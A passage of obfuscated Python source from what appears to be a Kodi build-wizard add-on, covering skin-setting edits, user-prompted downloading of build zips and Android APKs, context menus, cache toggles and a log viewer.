			O00OO00O0O0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4311
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'r')#line:4313
			OO0OOO0000OO000O0 =O0OO0000OO000000O .read ()#line:4314
			O0OO0000OO000000O .close ()#line:4315
			OO00O0O0000OO0O00 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4316
			OOOOO0000O0O0O0O0 =re .compile (OO00O0O0000OO0O00 ).findall (OO0OOO0000OO000O0 )[0 ]#line:4317
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'w')#line:4318
			O0OO0000OO000000O .write (OO0OOO0000OO000O0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOOO0000O0O0O0O0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4319
			O0OO0000OO000000O .close ()#line:4320
			O00OO00O0O0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4324
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'r')#line:4326
			OO0OOO0000OO000O0 =O0OO0000OO000000O .read ()#line:4327
			O0OO0000OO000000O .close ()#line:4328
			OO00O0O0000OO0O00 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4329
			OOOOO0000O0O0O0O0 =re .compile (OO00O0O0000OO0O00 ).findall (OO0OOO0000OO000O0 )[0 ]#line:4330
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'w')#line:4331
			O0OO0000OO000000O .write (OO0OOO0000OO000O0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOOO0000O0O0O0O0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4332
			O0OO0000OO000000O .close ()#line:4333
			O00OO00O0O0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4337
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'r')#line:4339
			OO0OOO0000OO000O0 =O0OO0000OO000000O .read ()#line:4340
			O0OO0000OO000000O .close ()#line:4341
			OO00O0O0000OO0O00 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4342
			OOOOO0000O0O0O0O0 =re .compile (OO00O0O0000OO0O00 ).findall (OO0OOO0000OO000O0 )[0 ]#line:4343
			O0OO0000OO000000O =open (O00OO00O0O0O00OO0 ,'w')#line:4344
			O0OO0000OO000000O .write (OO0OOO0000OO000O0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOOO0000O0O0O0O0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4345
			O0OO0000OO000000O .close ()#line:4346
		except :#line:4351
			pass #line:4352
def thirdPartyInstall (O0000OOOO0OO000O0 ,O00OO000O0OO00OOO ):#line:4354
	if not wiz .workingURL (O00OO000O0OO00OOO ):#line:4355
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4356
	O0000OOOOO000OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OOOO0OO000O0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4357
	if O0000OOOOO000OO00 ==1 :#line:4358
		freshStart ('third',True )#line:4359
	wiz .clearS ('build')#line:4360
	O00OOOO000O0O0OO0 =O0000OOOO0OO000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4361
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4362
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OOOO0OO000O0 ),'','אנא המתן')#line:4363
	OOOOO00000OO0O000 =os .path .join (PACKAGES ,'%s.zip'%O00OOOO000O0O0OO0 )#line:4364
	try :os .remove (OOOOO00000OO0O000 )#line:4365
	except :pass #line:4366
	downloader .download (O00OO000O0OO00OOO ,OOOOO00000OO0O000 ,DP )#line:4367
	xbmc .sleep (1000 )#line:4368
	OO0O00000OOOO0OO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OOOO0OO000O0 )#line:4369
	DP .update (0 ,OO0O00000OOOO0OO0 ,'','אנא המתן')#line:4370
	O000OO0O00O0OOO00 ,O0OO00O0OO0O00000 ,OOOO0OO0OOOOOOOO0 =extract .all (OOOOO00000OO0O000 ,HOME ,DP ,title =OO0O00000OOOO0OO0 )#line:4371
	if int (float (O000OO0O00O0OOO00 ))>0 :#line:4372
		wiz .fixmetas ()#line:4373
		wiz .lookandFeelData ('save')#line:4374
		wiz .defaultSkin ()#line:4375
		wiz .setS ('installed','true')#line:4377
		wiz .setS ('extract',str (O000OO0O00O0OOO00 ))#line:4378
		wiz .setS ('errors',str (O0OO00O0OO0O00000 ))#line:4379
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O000OO0O00O0OOO00 ,O0OO00O0OO0O00000 ))#line:4380
		try :os .remove (OOOOO00000OO0O000 )#line:4381
		except :pass #line:4382
		if int (float (O0OO00O0OO0O00000 ))>0 :#line:4383
			OOO0OOOO00O0OOOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OOOO0OO000O0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O000OO0O00O0OOO00 ,'%',COLOR1 ,O0OO00O0OO0O00000 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4384
			if OOO0OOOO00O0OOOOO :#line:4385
				if isinstance (O0OO00O0OO0O00000 ,unicode ):#line:4386
					OOOO0OO0OOOOOOOO0 =OOOO0OO0OOOOOOOO0 .encode ('utf-8')#line:4387
				wiz .TextBox (ADDONTITLE ,OOOO0OO0OOOOOOOO0 )#line:4388
	DP .close ()#line:4389
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4390
	if INSTALLMETHOD ==1 :OOOO0O0O0O0O0O0OO =1 #line:4391
	elif INSTALLMETHOD ==2 :OOOO0O0O0O0O0O0OO =0 #line:4392
	else :OOOO0O0O0O0O0O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4393
	if OOOO0O0O0O0O0O0OO ==1 :wiz .reloadFix ()#line:4394
	else :wiz .killxbmc (True )#line:4395
def testTheme (O0OOOOO00OO00OOO0 ):#line:4397
	O00OO00OO0OO0OOOO =zipfile .ZipFile (O0OOOOO00OO00OOO0 )#line:4398
	for O0OOO0O0OOOO0O0OO in O00OO00OO0OO0OOOO .infolist ():#line:4399
		if '/settings.xml'in O0OOO0O0OOOO0O0OO .filename :#line:4400
			return True #line:4401
	return False #line:4402
def testGui (O0O0OOOOO000OOOOO ):#line:4404
	OO0O0O000OO00000O =zipfile .ZipFile (O0O0OOOOO000OOOOO )#line:4405
	for OO0O0O000OO0OO0OO in OO0O0O000OO00000O .infolist ():#line:4406
		if '/guisettings.xml'in OO0O0O000OO0OO0OO .filename :#line:4407
			return True #line:4408
	return False #line:4409
def apkInstaller (O00O0OO0OO0O0OOO0 ,O0OO0000O0O000O00 ):#line:4411
	wiz .log (O00O0OO0OO0O0OOO0 )#line:4412
	wiz .log (O0OO0000O0O000O00 )#line:4413
	if wiz .platform ()=='android':#line:4414
		O0OO0OOO00000O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0OO0OO0O0OOO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4415
		if not O0OO0OOO00000O00O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4416
		OOOO0000OOOO00000 =O00O0OO0OO0O0OOO0 #line:4417
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4418
		if not wiz .workingURL (O0OO0000O0O000O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4419
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0000OOOO00000 ),'','אנא המתן')#line:4420
		O0000OOO0OO0OO00O =os .path .join (PACKAGES ,"%s.apk"%O00O0OO0OO0O0OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4421
		try :os .remove (O0000OOO0OO0OO00O )#line:4422
		except :pass #line:4423
		downloader .download (O0OO0000O0O000O00 ,O0000OOO0OO0OO00O ,DP )#line:4424
		xbmc .sleep (100 )#line:4425
		DP .close ()#line:4426
		notify .apkInstaller (O00O0OO0OO0O0OOO0 )#line:4427
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0000OOO0OO0OO00O +'")')#line:4428
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4429
def createMenu (O0O00O0O0000OOO0O ,O00OO00O00O00OOO0 ,O0O0OO0O00O00O0O0 ):#line:4435
	if O0O00O0O0000OOO0O =='saveaddon':#line:4436
		O0O00OO00000OOO0O =[]#line:4437
		OOO00000O000OOO00 =urllib .quote_plus (O00OO00O00O00OOO0 .lower ().replace (' ',''))#line:4438
		OOOO0O0O000OO0O00 =O00OO00O00O00OOO0 .replace ('Debrid','Real Debrid')#line:4439
		O0OO0O0O0OO00O0OO =urllib .quote_plus (O0O0OO0O00O00O0O0 .lower ().replace (' ',''))#line:4440
		O0O0OO0O00O00O0O0 =O0O0OO0O00O00O0O0 .replace ('url','URL Resolver')#line:4441
		O0O00OO00000OOO0O .append ((THEME2 %O0O0OO0O00O00O0O0 .title (),' '))#line:4442
		O0O00OO00000OOO0O .append ((THEME3 %'Save %s Data'%OOOO0O0O000OO0O00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO00000O000OOO00 ,O0OO0O0O0OO00O0OO )))#line:4443
		O0O00OO00000OOO0O .append ((THEME3 %'Restore %s Data'%OOOO0O0O000OO0O00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO00000O000OOO00 ,O0OO0O0O0OO00O0OO )))#line:4444
		O0O00OO00000OOO0O .append ((THEME3 %'Clear %s Data'%OOOO0O0O000OO0O00 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOO00000O000OOO00 ,O0OO0O0O0OO00O0OO )))#line:4445
	elif O0O00O0O0000OOO0O =='save':#line:4446
		O0O00OO00000OOO0O =[]#line:4447
		OOO00000O000OOO00 =urllib .quote_plus (O00OO00O00O00OOO0 .lower ().replace (' ',''))#line:4448
		OOOO0O0O000OO0O00 =O00OO00O00O00OOO0 .replace ('Debrid','Real Debrid')#line:4449
		O0OO0O0O0OO00O0OO =urllib .quote_plus (O0O0OO0O00O00O0O0 .lower ().replace (' ',''))#line:4450
		O0O0OO0O00O00O0O0 =O0O0OO0O00O00O0O0 .replace ('url','URL Resolver')#line:4451
		O0O00OO00000OOO0O .append ((THEME2 %O0O0OO0O00O00O0O0 .title (),' '))#line:4452
		O0O00OO00000OOO0O .append ((THEME3 %'Register %s'%OOOO0O0O000OO0O00 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOO00000O000OOO00 ,O0OO0O0O0OO00O0OO )))#line:4453
		O0O00OO00000OOO0O .append ((THEME3 %'Save %s Data'%OOOO0O0O000OO0O00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO00000O000OOO00 ,O0OO0O0O0OO00O0OO )))#line:4454
		O0O00OO00000OOO0O .append ((THEME3 %'Restore %s Data'%OOOO0O0O000OO0O00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO00000O000OOO00 ,O0OO0O0O0OO00O0OO )))#line:4455
		O0O00OO00000OOO0O .append ((THEME3 %'Import %s Data'%OOOO0O0O000OO0O00 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOO00000O000OOO00 ,O0OO0O0O0OO00O0OO )))#line:4456
		O0O00OO00000OOO0O .append ((THEME3 %'Clear Addon %s Data'%OOOO0O0O000OO0O00 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOO00000O000OOO00 ,O0OO0O0O0OO00O0OO )))#line:4457
	elif O0O00O0O0000OOO0O =='install':#line:4458
		O0O00OO00000OOO0O =[]#line:4459
		O0OO0O0O0OO00O0OO =urllib .quote_plus (O0O0OO0O00O00O0O0 )#line:4460
		O0O00OO00000OOO0O .append ((THEME2 %O0O0OO0O00O00O0O0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OO0O0O0OO00O0OO )))#line:4461
		O0O00OO00000OOO0O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OO0O0O0OO00O0OO )))#line:4462
		O0O00OO00000OOO0O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OO0O0O0OO00O0OO )))#line:4463
		O0O00OO00000OOO0O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OO0O0O0OO00O0OO )))#line:4464
		O0O00OO00000OOO0O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OO0O0O0OO00O0OO )))#line:4465
	O0O00OO00000OOO0O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4466
	return O0O00OO00000OOO0O #line:4467
def toggleCache (O0O0OOOOOOO00OO0O ):#line:4469
	OO0O000OOOO0O0O0O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4470
	OO0O0O0O00OO0000O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4471
	if O0O0OOOOOOO00OO0O in ['true','false']:#line:4472
		for OO0OO0000O00OO000 in OO0O000OOOO0O0O0O :#line:4473
			wiz .setS (OO0OO0000O00OO000 ,O0O0OOOOOOO00OO0O )#line:4474
	else :#line:4475
		if not O0O0OOOOOOO00OO0O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4476
			try :#line:4477
				OO0OO0000O00OO000 =OO0O0O0O00OO0000O [OO0O000OOOO0O0O0O .index (O0O0OOOOOOO00OO0O )]#line:4478
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0OO0000O00OO000 ))#line:4479
			except :#line:4480
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O0O0OOOOOOO00OO0O ))#line:4481
		else :#line:4482
			OO00OOOO0O00O0O00 ='true'if wiz .getS (O0O0OOOOOOO00OO0O )=='false'else 'false'#line:4483
			wiz .setS (O0O0OOOOOOO00OO0O ,OO00OOOO0O00O0O00 )#line:4484
def playVideo (OO00000O0O00O00OO ):#line:4486
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO00000O0O00O00OO )#line:4487
	if 'watch?v='in OO00000O0O00O00OO :#line:4488
		O0O00000OOO0OO0OO ,OOOO0OOOOOOOOOO00 =OO00000O0O00O00OO .split ('?')#line:4489
		O000000O0000O00O0 =OOOO0OOOOOOOOOO00 .split ('&')#line:4490
		for OOO0OO0OOOOOO00O0 in O000000O0000O00O0 :#line:4491
			if OOO0OO0OOOOOO00O0 .startswith ('v='):#line:4492
				OO00000O0O00O00OO =OOO0OO0OOOOOO00O0 [2 :]#line:4493
				break #line:4494
			else :continue #line:4495
	elif 'embed'in OO00000O0O00O00OO or 'youtu.be'in OO00000O0O00O00OO :#line:4496
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO00000O0O00O00OO )#line:4497
		O0O00000OOO0OO0OO =OO00000O0O00O00OO .split ('/')#line:4498
		if len (O0O00000OOO0OO0OO [-1 ])>5 :#line:4499
			OO00000O0O00O00OO =O0O00000OOO0OO0OO [-1 ]#line:4500
		elif len (O0O00000OOO0OO0OO [-2 ])>5 :#line:4501
			OO00000O0O00O00OO =O0O00000OOO0OO0OO [-2 ]#line:4502
	wiz .log ("YouTube URL: %s"%OO00000O0O00O00OO )#line:4503
	yt .PlayVideo (OO00000O0O00O00OO )#line:4504
def viewLogFile ():#line:4506
	O000O0OOO0OOOOOO0 =wiz .Grab_Log (True )#line:4507
	O0O0OO000OO0O00OO =wiz .Grab_Log (True ,True )#line:4508
	OOOOO00OO00000O0O =0 ;O00O00O000OO0O00O =O000O0OOO0OOOOOO0 #line:4509
	if not O0O0OO000OO0O00OO ==False and not O000O0OOO0OOOOOO0 ==False :#line:4510
		OOOOO00OO00000O0O =DIALOG .select (ADDONTITLE ,["View %s"%O000O0OOO0OOOOOO0 .replace (LOG ,""),"View %s"%O0O0OO000OO0O00OO .replace (LOG ,"")])#line:4511
		if OOOOO00OO00000O0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4512
	elif O000O0OOO0OOOOOO0 ==False and O0O0OO000OO0O00OO ==False :#line:4513
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4514
		return #line:4515
	elif not O000O0OOO0OOOOOO0 ==False :OOOOO00OO00000O0O =0 #line:4516
	elif not O0O0OO000OO0O00OO ==False :OOOOO00OO00000O0O =1 #line:4517
	O00O00O000OO0O00O =O000O0OOO0OOOOOO0 if OOOOO00OO00000O0O ==0 else O0O0OO000OO0O00OO #line:4519
	O0O0O0OOOOOOO0OO0 =wiz .Grab_Log (False )if OOOOO00OO00000O0O ==0 else wiz .Grab_Log (False ,True )#line:4520
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O00O00O000OO0O00O ),O0O0O0OOOOOOO0OO0 )#line:4522
def errorChecking (log =None ,count =None ,all =None ):#line:4524
	if log ==None :#line:4525
		O000OOOO0O0OOOOO0 =wiz .Grab_Log (True )#line:4526
		O0000O00OOOO00000 =wiz .Grab_Log (True ,True )#line:4527
		if not O0000O00OOOO00000 ==False and not O000OOOO0O0OOOOO0 ==False :#line:4528
			O000OOOOOO0OOO00O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O000OOOO0O0OOOOO0 .replace (LOG ,""),errorChecking (O000OOOO0O0OOOOO0 ,True ,True )),"View %s: %s error(s)"%(O0000O00OOOO00000 .replace (LOG ,""),errorChecking (O0000O00OOOO00000 ,True ,True ))])#line:4529
			if O000OOOOOO0OOO00O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4530
		elif O000OOOO0O0OOOOO0 ==False and O0000O00OOOO00000 ==False :#line:4531
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4532
			return #line:4533
		elif not O000OOOO0O0OOOOO0 ==False :O000OOOOOO0OOO00O =0 #line:4534
		elif not O0000O00OOOO00000 ==False :O000OOOOOO0OOO00O =1 #line:4535
		log =O000OOOO0O0OOOOO0 if O000OOOOOO0OOO00O ==0 else O0000O00OOOO00000 #line:4536
	if log ==False :#line:4537
		if count ==None :#line:4538
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4539
			return False #line:4540
		else :#line:4541
			return 0 #line:4542
	else :#line:4543
		if os .path .exists (log ):#line:4544
			O0O00OO0000O00OOO =open (log ,mode ='r');OOOOOO0OOOOO00OO0 =O0O00OO0000O00OOO .read ().replace ('\n','').replace ('\r','');O0O00OO0000O00OOO .close ()#line:4545
			OOO0O00OO0O00O00O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOOOOO0OOOOO00OO0 )#line:4546
			if not count ==None :#line:4547
				if all ==None :#line:4548
					OOOOOO000O00O0O0O =0 #line:4549
					for OOOOO0OO0OO0OOO0O in OOO0O00OO0O00O00O :#line:4550
						if ADDON_ID in OOOOO0OO0OO0OOO0O :OOOOOO000O00O0O0O +=1 #line:4551
					return OOOOOO000O00O0O0O #line:4552
				else :return len (OOO0O00OO0O00O00O )#line:4553
			if len (OOO0O00OO0O00O00O )>0 :#line:4554
				OOOOOO000O00O0O0O =0 ;O0O0000O0OOOO0OOO =""#line:4555
				for OOOOO0OO0OO0OOO0O in OOO0O00OO0O00O00O :#line:4556
					if all ==None and not ADDON_ID in OOOOO0OO0OO0OOO0O :continue #line:4557
					else :#line:4558
						OOOOOO000O00O0O0O +=1 #line:4559
						O0O0000O0OOOO0OOO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOOOO000O00O0O0O ,OOOOO0OO0OO0OOO0O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4560
				if OOOOOO000O00O0O0O >0 :#line:4561
					wiz .TextBox (ADDONTITLE ,O0O0000O0OOOO0OOO )#line:4562
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4563
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4564
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4565
ACTION_PREVIOUS_MENU =10 #line:4567
ACTION_NAV_BACK =92 #line:4568
ACTION_MOVE_LEFT =1 #line:4569
ACTION_MOVE_RIGHT =2 #line:4570
ACTION_MOVE_UP =3 #line:4571
ACTION_MOVE_DOWN =4 #line:4572
ACTION_MOUSE_WHEEL_UP =104 #line:4573
ACTION_MOUSE_WHEEL_DOWN =105 #line:4574
ACTION_MOVE_MOUSE =107 #line:4575
ACTION_SELECT_ITEM =7 #line:4576
ACTION_BACKSPACE =110 #line:4577
ACTION_MOUSE_LEFT_CLICK =100 #line:4578
ACTION_MOUSE_LONG_CLICK =108 #line:4579
def LogViewer (default =None ):#line:4581
	class O0O00OO00OO00OOOO (xbmcgui .WindowXMLDialog ):#line:4582
		def __init__ (O000O00OOO0OO0O00 ,*OO0OO0OOO00OOOO0O ,**O0O0O0OO000OO0OO0 ):#line:4583
			O000O00OOO0OO0O00 .default =O0O0O0OO000OO0OO0 ['default']#line:4584
		def onInit (OOO000OOO0O0O00O0 ):#line:4586
			OOO000OOO0O0O00O0 .title =101 #line:4587
			OOO000OOO0O0O00O0 .msg =102 #line:4588
			OOO000OOO0O0O00O0 .scrollbar =103 #line:4589
			OOO000OOO0O0O00O0 .upload =201 #line:4590
			OOO000OOO0O0O00O0 .kodi =202 #line:4591
			OOO000OOO0O0O00O0 .kodiold =203 #line:4592
			OOO000OOO0O0O00O0 .wizard =204 #line:4593
			OOO000OOO0O0O00O0 .okbutton =205 #line:4594
			OOOOO00O0O00O00O0 =open (OOO000OOO0O0O00O0 .default ,'r')#line:4595
			OOO000OOO0O0O00O0 .logmsg =OOOOO00O0O00O00O0 .read ()#line:4596
			OOOOO00O0O00O00O0 .close ()#line:4597
			OOO000OOO0O0O00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO000OOO0O0O00O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4598
			OOO000OOO0O0O00O0 .showdialog ()#line:4599
		def showdialog (OOO000O0O0O000O00 ):#line:4601
			OOO000O0O0O000O00 .getControl (OOO000O0O0O000O00 .title ).setLabel (OOO000O0O0O000O00 .titlemsg )#line:4602
			OOO000O0O0O000O00 .getControl (OOO000O0O0O000O00 .msg ).setText (wiz .highlightText (OOO000O0O0O000O00 .logmsg ))#line:4603
			OOO000O0O0O000O00 .setFocusId (OOO000O0O0O000O00 .scrollbar )#line:4604
		def onClick (OO0OOOOO0OOO00OOO ,O00O000OOOO0OO000 ):#line:4606
			if O00O000OOOO0OO000 ==OO0OOOOO0OOO00OOO .okbutton :OO0OOOOO0OOO00OOO .close ()#line:4607
			elif O00O000OOOO0OO000 ==OO0OOOOO0OOO00OOO .upload :OO0OOOOO0OOO00OOO .close ();uploadLog .Main ()#line:4608
			elif O00O000OOOO0OO000 ==OO0OOOOO0OOO00OOO .kodi :#line:4609
				OOOO00OO0000OOOO0 =wiz .Grab_Log (False )#line:4610
				O0O0OO0O0O0O0OOOO =wiz .Grab_Log (True )#line:4611
				if OOOO00OO0000OOOO0 ==False :#line:4612
					OO0OOOOO0OOO00OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4613
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .msg ).setText ("Log File Does Not Exists!")#line:4614
				else :#line:4615
					OO0OOOOO0OOO00OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OO0O0O0O0OOOO .replace (LOG ,''))#line:4616
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .title ).setLabel (OO0OOOOO0OOO00OOO .titlemsg )#line:4617
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .msg ).setText (wiz .highlightText (OOOO00OO0000OOOO0 ))#line:4618
					OO0OOOOO0OOO00OOO .setFocusId (OO0OOOOO0OOO00OOO .scrollbar )#line:4619
			elif O00O000OOOO0OO000 ==OO0OOOOO0OOO00OOO .kodiold :#line:4620
				OOOO00OO0000OOOO0 =wiz .Grab_Log (False ,True )#line:4621
				O0O0OO0O0O0O0OOOO =wiz .Grab_Log (True ,True )#line:4622
				if OOOO00OO0000OOOO0 ==False :#line:4623
					OO0OOOOO0OOO00OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4624
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .msg ).setText ("Log File Does Not Exists!")#line:4625
				else :#line:4626
					OO0OOOOO0OOO00OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OO0O0O0O0OOOO .replace (LOG ,''))#line:4627
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .title ).setLabel (OO0OOOOO0OOO00OOO .titlemsg )#line:4628
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .msg ).setText (wiz .highlightText (OOOO00OO0000OOOO0 ))#line:4629
					OO0OOOOO0OOO00OOO .setFocusId (OO0OOOOO0OOO00OOO .scrollbar )#line:4630
			elif O00O000OOOO0OO000 ==OO0OOOOO0OOO00OOO .wizard :#line:4631
				OOOO00OO0000OOOO0 =wiz .Grab_Log (False ,False ,True )#line:4632
				O0O0OO0O0O0O0OOOO =wiz .Grab_Log (True ,False ,True )#line:4633
				if OOOO00OO0000OOOO0 ==False :#line:4634
					OO0OOOOO0OOO00OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4635
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .msg ).setText ("Log File Does Not Exists!")#line:4636
				else :#line:4637
					OO0OOOOO0OOO00OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OO0O0O0O0OOOO .replace (ADDONDATA ,''))#line:4638
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .title ).setLabel (OO0OOOOO0OOO00OOO .titlemsg )#line:4639
					OO0OOOOO0OOO00OOO .getControl (OO0OOOOO0OOO00OOO .msg ).setText (wiz .highlightText (OOOO00OO0000OOOO0 ))#line:4640
					OO0OOOOO0OOO00OOO .setFocusId (OO0OOOOO0OOO00OOO .scrollbar )#line:4641
		def onAction (O0OOO0OO0O000OO0O ,OO0000O00000OO0OO ):#line:4643
